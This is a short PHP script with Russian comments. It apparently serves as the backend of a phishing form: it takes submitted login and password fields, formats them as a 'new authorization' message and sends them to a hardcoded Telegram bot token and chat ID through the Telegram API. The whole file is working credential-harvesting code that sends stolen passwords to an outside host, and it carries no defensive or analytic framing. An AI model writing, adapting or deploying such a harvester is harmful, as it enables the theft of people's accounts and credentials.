<?php
// Настройки
$token = "7892176137:AAEMjPrYVtjIPKA4MmqNMnGjeOiC3XaPxjQ";
$chat_id = "796625509";

// Получение данных из формы
$login = $_POST['login'] ?? 'не указано';
$par = $_POST['par'] ?? 'не указано';

// Формируем сообщение
$message = "🔐 Новая авторизация:\n\n👤 Логин: $login\n🔑 Пароль: $par";

// Отправка в Telegram
$sendToTelegram = file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

if ($sendToTelegram) {
    echo "ok";
} else {
    echo "Ошибка отправки";
}
?>
